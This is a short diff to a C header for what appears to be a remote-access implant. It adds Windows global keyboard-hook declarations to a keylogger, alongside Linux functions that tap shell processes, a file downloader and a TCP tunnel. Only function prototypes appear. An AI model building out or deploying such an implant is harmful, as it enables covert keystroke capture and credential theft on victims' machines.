@@ -11,12 +11,10 @@
 #ifdef __WIN32__
   #define IS_WINDOWS
   #define WIN32_LEAN_AND_MEAN
-  #define _WIN32_WINNT 0x0501
   #include <windows.h>
   #include <wininet.h>
   #include <winsock2.h>
   #include <ws2tcpip.h>
-  #define PATH_MAX 256
 #else
   #define IS_LINUX
 #endif
@@ -117,11 +115,17 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff);
 // Starts the keylogger
 void keymon(session *striker, task *tsk);
 
-// Monitors processes and call keymon_proc_attach() to have the keylogged.
-void *keymon_proc_watch(void *ptr);
-
-// Called by keymon in bg thread for every shell process to be tapped.
-void *keymon_proc_attach(void *ptr);
+#ifdef IS_LINUX
+  // Monitors processes and call keymon_proc_attach() to have the keylogged.
+  void *keymon_proc_watch(void *ptr);
+  // Called by keymon in bg thread for every shell process to be tapped.
+  void *keymon_proc_attach(void *ptr);
+#else
+  // Creates a global keyboard hook for keymon.
+  DWORD WINAPI keymon_create_hook(LPVOID ptr);
+  // The hook procedure.
+  LRESULT CALLBACK keymon_hook_proc(int nCode, WPARAM wParam, LPARAM lParam);
+#endif
 
 // Starts a TCP tunnel server.
 int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport);
